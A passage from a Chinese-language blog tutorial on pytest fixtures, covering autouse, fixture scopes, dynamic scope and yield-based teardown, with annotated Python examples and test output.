class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># contents of test_append.py</span><br><span class="hljs-keyword">import</span> pytest<br><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">first_entry</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;a&quot;</span><br><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">order</span>(<span class="hljs-params">first_entry</span>): <span class="hljs-comment"># 这里的first_entry,只是定义了一个形参，可以随便传参，</span><br>    <span class="hljs-comment"># 换一个写法就是 def order(argument:first_entry):这样可以看的更清晰</span><br>    <span class="hljs-keyword">return</span> []<br><br><span class="hljs-meta">@pytest.fixture(<span class="hljs-params">autouse=<span class="hljs-literal">True</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">append_first</span>(<span class="hljs-params">order, first_entry</span>):<br>    <span class="hljs-keyword">return</span> order.append(first_entry)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_string_only</span>(<span class="hljs-params">order, first_entry</span>):  <span class="hljs-comment"># 明明没有引用 append_first，却产生了效果，</span><br>    <span class="hljs-comment"># 这里就会想呀，order 不是一个空列表吗？使用了 append_first 才会忘order里面添加 first_entry，</span><br>    <span class="hljs-comment"># 这就是 autouse=True 的作用 ，隐式的使用了 append_first</span><br>    <span class="hljs-built_in">print</span>(order) <span class="hljs-comment"># [&#x27;a&#x27;]</span><br>    <span class="hljs-keyword">assert</span> order == [first_entry]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_string_and_int</span>(<span class="hljs-params">order, first_entry</span>):<br>    order.append(<span class="hljs-number">2</span>)<br>    <span class="hljs-comment"># 这里就跟明显了，arder 里面添加了 2，本应该是[2]的，但是打印出来是[&quot;a&quot;, 2]，因为隐方的调用了 append_first往order里面添加了first_entry &quot;a&quot;</span><br>    <span class="hljs-built_in">print</span>(order) <span class="hljs-comment"># [&#x27;a&#x27;, 2]</span><br>    <span class="hljs-keyword">assert</span> order == [first_entry, <span class="hljs-number">2</span>]<br><br></code></pre></td></tr></table></figure><p>在此示例中，<code>append_first</code> 固定装置是自动使用固定装置。因为它是自动发生的，所以两个测试都会受到它的影响，即使两个测试都没有请求它。但这并不意味着他们不能被请求；只是没有必要写罢了—-&gt;<strong>隐式传递</strong></p><h2 id="4-3-作用域：跨类、模块、包或会话共享fixture【重点】"><a href="#4-3-作用域：跨类、模块、包或会话共享fixture【重点】" class="headerlink" title="4.3 作用域：跨类、模块、包或会话共享fixture【重点】"></a>4.3 作用域：跨类、模块、包或会话共享fixture【重点】</h2><h3 id="4-3-1理解fixture-作用域【重点】"><a href="#4-3-1理解fixture-作用域【重点】" class="headerlink" title="4.3.1理解fixture 作用域【重点】"></a>4.3.1理解fixture 作用域【重点】</h3><p>需要网络访问的<code>fixtures</code>取决于连接性，并且创建起来通常非常耗时。</p><p>扩展前面的例子</p><p>我们可以在 <code>@pytest.fixture </code>调用中添加一个 <code>scope=&quot;module&quot; </code>参数来引发 smtp_connection 固定功能，负责创建到预先存在的 SMTP 服务器的连接，</p><p>每个测试模块仅调用一次（默认为每个测试函数调用一次）。</p><p>因此，测试模块中的多个测试函数将各自接收相同的 smtp_connection 夹具实例，从而节省时间</p><p>范围的可能值为：函数、类、模块、包或会话。</p><p>下一个示例将fixture函数放入单独的conftest.py文件中，以便目录中多个测试模块的测试可以访问fixture函数：</p><blockquote><p>官方的代码有点看的不是特别清晰，可以直接看下面代码</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of conftest.py</span><br><span class="hljs-keyword">import</span> smtplib<br><br><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-meta">@pytest.fixture(<span class="hljs-params">scope=<span class="hljs-string">&quot;module&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">smtp_connection</span>():<br>    <span class="hljs-keyword">return</span> smtplib.SMTP(<span class="hljs-string">&quot;smtp.gmail.com&quot;</span>, <span class="hljs-number">587</span>, timeout=<span class="hljs-number">5</span>)<br><span class="hljs-comment"># content of test_module.py</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_ehlo</span>(<span class="hljs-params">smtp_connection</span>):<br>    response, msg = smtp_connection.ehlo()<br>    <span class="hljs-keyword">assert</span> response == <span class="hljs-number">250</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-string">b&quot;smtp.gmail.com&quot;</span> <span class="hljs-keyword">in</span> msg<br>    <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span>  <span class="hljs-comment"># for demo purposes</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_noop</span>(<span class="hljs-params">smtp_connection</span>):<br>    response, msg = smtp_connection.noop()<br>    <span class="hljs-keyword">assert</span> response == <span class="hljs-number">250</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span>  <span class="hljs-comment"># for demo purposes</span><br></code></pre></td></tr></table></figure><p>这里，test_ehlo 需要 smtp_connection 固定值。 pytest 将发现并调用 @pytest.fixture 标记的 smtp_connection 固定功能。运行测试如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python">$ pytest test_module.py<br>=========================== test session starts ============================<br>platform linux -- Python <span class="hljs-number">3.</span>x.y, pytest-<span class="hljs-number">8.</span>x.y, pluggy-<span class="hljs-number">1.</span>x.y<br>rootdir: /home/sweet/project<br>collected <span class="hljs-number">2</span> items<br><br>test_module.py FF                                                    [<span class="hljs-number">100</span>%]<br><br>================================= FAILURES =================================<br>________________________________ test_ehlo _________________________________<br><br>smtp_connection = &lt;smtplib.SMTP <span class="hljs-built_in">object</span> at <span class="hljs-number">0xdeadbeef0001</span>&gt;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_ehlo</span>(<span class="hljs-params">smtp_connection</span>):<br>        response, msg = smtp_connection.ehlo()<br>        <span class="hljs-keyword">assert</span> response == <span class="hljs-number">250</span><br>        <span class="hljs-keyword">assert</span> <span class="hljs-string">b&quot;smtp.gmail.com&quot;</span> <span class="hljs-keyword">in</span> msg<br>&gt;       <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span>  <span class="hljs-comment"># for demo purposes</span><br>E       <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span><br><br>test_module.py:<span class="hljs-number">7</span>: AssertionError<br>________________________________ test_noop _________________________________<br><br>smtp_connection = &lt;smtplib.SMTP <span class="hljs-built_in">object</span> at <span class="hljs-number">0xdeadbeef0001</span>&gt;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_noop</span>(<span class="hljs-params">smtp_connection</span>):<br>        response, msg = smtp_connection.noop()<br>        <span class="hljs-keyword">assert</span> response == <span class="hljs-number">250</span><br>&gt;       <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span>  <span class="hljs-comment"># for demo purposes</span><br>E       <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span><br><br>test_module.py:<span class="hljs-number">13</span>: AssertionError<br>========================= short test summary info ==========================<br>FAILED test_module.py::test_ehlo - <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span><br>FAILED test_module.py::test_noop - <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span><br>============================ <span class="hljs-number">2</span> failed <span class="hljs-keyword">in</span> <span class="hljs-number">0.12</span>s =============================<br></code></pre></td></tr></table></figure><p>您会看到两个断言 0 失败，更重要的是您还可以看到完全相同的 smtp_connection 对象被传递到两个测试函数中，因为 pytest 在回溯中显示传入的参数值。因此，使用 smtp_connection 的两个测试函数运行速度与单个测试函数一样快，因为它们重复使用相同的实例。</p><p>两个测试用例，虽然都引入的这个fixture，但是，其实这个fixture是只运行了一次，没有被重复的运行，而且只在模块级别运行，假如这个fixture是函数级别的，那就是每个测试方法单独运行一次，同理，假如是类级别的，那就是每个类单独运行一次，下面会介绍所有级别</p><blockquote><p>看下面的代码可以更清晰</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;这个类，如果是第一次被实例化对象，age的值就是1，如果是第二次，age得值就是2&quot;&quot;&quot;</span><br>    instance_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        MyClass.instance_count += <span class="hljs-number">1</span><br>        self.age = MyClass.instance_count<br><br><br><span class="hljs-meta">@pytest.fixture(<span class="hljs-params">scope=<span class="hljs-string">&quot;module&quot;</span></span>) </span><span class="hljs-comment"># 模块级别</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">module_test</span>():<br>    Tom = MyClass()<br>    <span class="hljs-keyword">return</span> Tom <span class="hljs-comment"># 返回类的实例化对象的age属性</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_ehlo</span>(<span class="hljs-params">module_test</span>):<br>    TestTom = module_test<br>    <span class="hljs-keyword">assert</span> TestTom.age == <span class="hljs-number">1</span> <span class="hljs-comment"># 这个测试用例和下面的测试用例，返回的是同一个实例化对象，所以age的值都是1</span><br><br><span class="hljs-comment"># 说白了，就是这两个测试用例，使用的都是同一个实例化对象，</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_noop</span>(<span class="hljs-params">module_test</span>):<br>    TestTom = module_test<br>    <span class="hljs-keyword">assert</span> TestTom.age == <span class="hljs-number">1</span> <br></code></pre></td></tr></table></figure><blockquote><p>如果改一下，改成function 级别的呢？测试用例就不会通过</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;这个类，如果是第一次被实例化对象，age的值就是1，如果是第二次，age得值就是2&quot;&quot;&quot;</span><br>    instance_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        MyClass.instance_count += <span class="hljs-number">1</span><br>        self.age = MyClass.instance_count<br><br><br><span class="hljs-meta">@pytest.fixture(<span class="hljs-params">scope=<span class="hljs-string">&quot;function&quot;</span></span>) </span><span class="hljs-comment"># 模块级别</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">module_test</span>():<br>    Tom = MyClass()<br>    <span class="hljs-keyword">return</span> Tom <span class="hljs-comment"># 返回类的实例化对象的age属性</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_ehlo</span>(<span class="hljs-params">module_test</span>):<br>    TestTom = module_test<br>    <span class="hljs-keyword">assert</span> TestTom.age == <span class="hljs-number">1</span> <span class="hljs-comment"># 这个测试用例和下面的测试用例，返回的是同一个实例化对象，所以age的值都是1</span><br><br><span class="hljs-comment"># 说白了，就是这两个测试用例，使用的都是同一个实例化对象，</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_noop</span>(<span class="hljs-params">module_test</span>):<br>    TestTom = module_test<br>    <span class="hljs-keyword">assert</span> TestTom.age == <span class="hljs-number">1</span> <br><br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">================================ FAILURES =================================================<br>________________________________ test_noop _________________________________________<br><br>module_test = &lt;test_fixturestest.MyClass <span class="hljs-built_in">object</span> at <span class="hljs-number">0x7f0eeb976b60</span>&gt;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_noop</span>(<span class="hljs-params">module_test</span>):<br>        TestTom = module_test<br>&gt;       <span class="hljs-keyword">assert</span> TestTom.age == <span class="hljs-number">1</span><br>E       <span class="hljs-keyword">assert</span> <span class="hljs-number">2</span> == <span class="hljs-number">1</span><br>E        +  where <span class="hljs-number">2</span> = &lt;test_fixturestest.MyClass <span class="hljs-built_in">object</span> at <span class="hljs-number">0x7f0eeb976b60</span>&gt;.age<br><br>testcases/test_fixturestest.py:<span class="hljs-number">206</span>: AssertionError<br>======================= short test summary info ===========================================<br>FAILED testcases/test_fixturestest.py::test_noop - <span class="hljs-keyword">assert</span> <span class="hljs-number">2</span> == <span class="hljs-number">1</span><br>============================ <span class="hljs-number">1</span> failed, <span class="hljs-number">1</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">0.01</span>s ==============================<br></code></pre></td></tr></table></figure><p>如果您决定希望拥有一个会话范围的 smtp_connection 实例，您可以简单地声明它：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@pytest.fixture(<span class="hljs-params">scope=<span class="hljs-string">&quot;session&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">smtp_connection</span>():<br>    <span class="hljs-comment"># the returned fixture value will be shared for</span><br>    <span class="hljs-comment"># all tests requesting it</span><br>    ...<br></code></pre></td></tr></table></figure><h3 id="4-3-2-Fixture-作用域范围【重点】"><a href="#4-3-2-Fixture-作用域范围【重点】" class="headerlink" title="4.3.2 Fixture 作用域范围【重点】"></a>4.3.2 Fixture 作用域范围【重点】</h3><p>夹具在测试首次请求时创建，并根据其范围销毁：</p><ul><li><code>function</code>: 默认范围，fixture在每个测试用例结束时销毁。.</li><li><code>class</code>: 该fixture在class最后一次测试的测试用例时被销毁。</li><li><code>module</code>: 模块级别（py文件）</li><li><code>package</code>: 包级别（文件夹）</li><li><code>session</code>: 会话级别（整场测试）</li></ul><p>模块级别、包级别、会话级别也是一样，因为fixture是在conftest.py文件里写的，这个文件是放在项目的根目录下的，你的测试用例，不一定全都是放在一个模块内（py文件）一个包内（文件夹），会话级别的意思就是整场测试用例的级别。</p><blockquote><p>Pytest 一次仅缓存fixture装置的一个实例，这意味着当使用参数化fixture装置时，pytest 可能会在给定范围内多次调用fixture装置。</p></blockquote><h3 id="4-3-3-fixture-动态范围–自定义作用域"><a href="#4-3-3-fixture-动态范围–自定义作用域" class="headerlink" title="4.3.3 fixture 动态范围–自定义作用域"></a>4.3.3 fixture 动态范围–自定义作用域</h3><p>在某些情况下，您可能希望在不更改代码的情况下更改夹具的范围。为此，请将可调用对象传递给作用域。</p><p>可调用函数必须返回一个具有有效范围的字符串，并且仅在夹具定义期间执行一次。它将使用两个关键字参数进行调用——fixture_name 作为字符串，config 使用配置对象。</p><p>当处理需要时间设置的固定装置（例如生成 docker 容器）时，这尤其有用。</p><p>可以使用命令行参数来控制不同环境下生成的容器的范围。请参阅下面的示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># determine_scope 函数的定义是受两个参数：fixture_name 和 config。fixture_name 是 fixture 的名称，而 config 是 pytest 的配置对象。</span><br><span class="hljs-comment"># 函数的逻辑是，如果在 pytest 的命令行选项中存在 --keep-containers 选项（表示保持容器的选项），则返回 &quot;session&quot; 作为 fixture 的作用域；否则，返回 &quot;function&quot; 作为 fixture 的作用域。</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">determine_scope</span>(<span class="hljs-params">fixture_name, config</span>):<br>    <span class="hljs-keyword">if</span> config.getoption(<span class="hljs-string">&quot;--keep-containers&quot;</span>, <span class="hljs-literal">None</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;session&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;function&quot;</span><br><br><span class="hljs-comment"># fixture 的名称是 docker_container。</span><br><span class="hljs-comment">#scope=determine_scope 将作用域参数设置为 determine_scope 函数的返回值。也就是说，根据 determine_scope 函数的逻辑，这个 fixture 的作用域将根据 --keep-containers 命令行选项的存在与否来确定。</span><br><span class="hljs-meta">@pytest.fixture(<span class="hljs-params">scope=determine_scope</span>) </span><span class="hljs-comment"># scope=&quot;session&quot;或者&quot;function&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">docker_container</span>():<br>    <span class="hljs-keyword">yield</span> spawn_container()<br><span class="hljs-comment"># yield spawn_container() 表示在 fixture 的设置和清理过程中生成一个值。spawn_container() 是一个函数，它可能在 fixture 的设置阶段创建一个容器，并在 fixture 的清理阶段销毁容器。yield 语句将生成的值暂时提供给使用该 fixture 的测试函数，以便进行测试操作。</span><br></code></pre></td></tr></table></figure><h2 id="4-4-Teardown-Cleanup-又称前置和后置"><a href="#4-4-Teardown-Cleanup-又称前置和后置" class="headerlink" title="4.4 Teardown&#x2F;Cleanup (又称前置和后置)"></a>4.4 Teardown&#x2F;Cleanup (又称前置和后置)</h2><p>当我们运行测试时，我们需要确保它们自行清理，这样它们就不会干扰任何其他测试（同时我们也不会留下大量的测试数据来使系统膨胀）</p><p>pytest 中的装置提供了一个非常有用的拆卸系统，它允许我们定义每个装置自行清理所需的特定步骤。</p><p>可以通过两种方式利用该系统。</p><h3 id="1-yield-fixtures-【推荐】"><a href="#1-yield-fixtures-【推荐】" class="headerlink" title="1. yield fixtures 【推荐】"></a>1. <code>yield</code> fixtures 【推荐】</h3><p>“Yield” fixtures使用 <code>yield</code> 而不是 <code>return</code>.，我们可以运行一些代码并将对象传递回请求的装置&#x2F;测试，就像其他装置一样。唯一的区别是：</p><ol><li><code>return</code>换成<code>yield</code></li><li>一些 <code>teardown</code>代码放在<code>yiend</code>的后面</li></ol><p>一旦 pytest 计算出fixtures装置的线性顺序，它将运行每个fixtures装置，直到它返回或产生，然后转到列表中的下一个fixtures装置以执行相同的操作。</p><p>测试完成后，pytest 将返回fixtures装置列表，但以相反的顺序，获取每个生成的fixtures装置，并运行其中位于yield 语句之后的代码。</p><p>举一个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of emaillib.py</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MailAdminClient</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_user</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> MailUser()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_user</span>(<span class="hljs-params">self, user</span>):<br>        <span class="hljs-comment"># do some cleanup</span><br>        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MailUser</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.inbox = []<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send_email</span>(<span class="hljs-params">self, email, other</span>):<br>        other.inbox.append(email)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">clear_mailbox</span>(<span class="hljs-params">self</span>):<br>        self.inbox.clear()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Email</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, subject, body</span>):<br>        self.subject = subject<br>        self.body = body<br></code></pre></td></tr></table></figure><p>假设我们要测试从一个用户向另一个用户发送电子邮件。</p><ol><li>我们必须首先创建每个用户，</li><li>然后将电子邮件从一个用户发送到另一个用户，</li><li>最后断言另一个用户在其收件箱中收到了该消息。</li></ol><p>如果我们想在测试运行后进行清理，我们可能必须确保在删除其他用户之前清空该用户的邮箱，否则系统可能会有垃圾数据。</p><p>看一下示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MailAdminClient</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_user</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;create user&quot;</span>)<br>        <span class="hljs-keyword">return</span> MailUser()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_user</span>(<span class="hljs-params">self, user</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;delete user&quot;</span>)<br>        <span class="hljs-comment"># do some cleanup</span><br>        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MailUser</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.inbox = []<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send_email</span>(<span class="hljs-params">self, email, other</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;send email&quot;</span>)<br>        other.inbox.append(email)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">clear_mailbox</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;clearing mailbox&quot;</span>)<br>        self.inbox.clear()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Email</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, subject, body</span>):<br>        self.subject = subject<br>        self.body = body<br><br><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mail_admin</span>():<br>    <span class="hljs-keyword">return</span> MailAdminClient()<br><br><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sending_user</span>(<span class="hljs-params">mail_admin</span>):<br>    user = mail_admin.create_user()<br>    <span class="hljs-keyword">yield</span> user<br>    mail_admin.delete_user(user)<br><br><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">receiving_user</span>(<span class="hljs-params">mail_admin</span>):<br>    user = mail_admin.create_user()<br>    <span class="hljs-keyword">yield</span> user<br>    user.clear_mailbox()<br>    mail_admin.delete_user(user)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_email_received</span>(<span class="hljs-params">sending_user, receiving_user</span>):<br>    email = Email(subject=<span class="hljs-string">&quot;Hey!&quot;</span>, body=<span class="hljs-string">&quot;How&#x27;s it going?&quot;</span>)<br>    sending_user.send_email(email, receiving_user)<br>    <span class="hljs-keyword">assert</span> email <span class="hljs-keyword">in</span> receiving_user.inbox<br></code></pre></td></tr></table></figure><p>看一下运行的结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">============================ test session starts =======================================<br>platform linux -- Python <span class="hljs-number">3.10</span><span class="hljs-number">.12</span>, pytest-<span class="hljs-number">8.1</span><span class="hljs-number">.1</span>, pluggy-<span class="hljs-number">1.4</span><span class="hljs-number">.0</span><br><br>plugins: anyio-<span class="hljs-number">4.2</span><span class="hljs-number">.0</span><br>collected <span class="hljs-number">1</span> item                                                                                                                                                                    <br><br>testcases/test_fixturestest.py <br>create user <span class="hljs-comment"># 开始时运行了</span><br>create user<br>send email<br>.clearing mailbox<br>delete user <span class="hljs-comment"># 结束时运行了</span><br>delete user<br><br><br>========================= <span class="hljs-number">1</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">0.01</span>s =============================================<br></code></pre></td></tr></table></figure><p>因为receiving_user是安装过程中最后一个运行的fixture装置，所以它也是拆卸过程中第一个运行的fixture装置。</p><h4 id="yield-fixture处理错误"><a href="#yield-fixture处理错误" class="headerlink" title="yield fixture处理错误"></a>yield fixture处理错误</h4><p>如果yield装置在yield之前引发异常，pytest将不会尝试在该yield装置的yield语句之后运行结束代码。</p><p>但是，对于已经成功运行该测试的每个fixture装置，pytest 仍会像平常一样尝试将其拆除。</p><blockquote><p>也就是说，如果你在yield之前报错了，就不会运行yield之后的代码了，如果yield之前没报错，就肯定会运行yield之后的代码，哪怕yield之后也有报错</p></blockquote><h3 id="2-直接添加终结器finalizers"><a href="#2-直接添加终结器finalizers" class="headerlink" title="2. 直接添加终结器finalizers"></a>2. 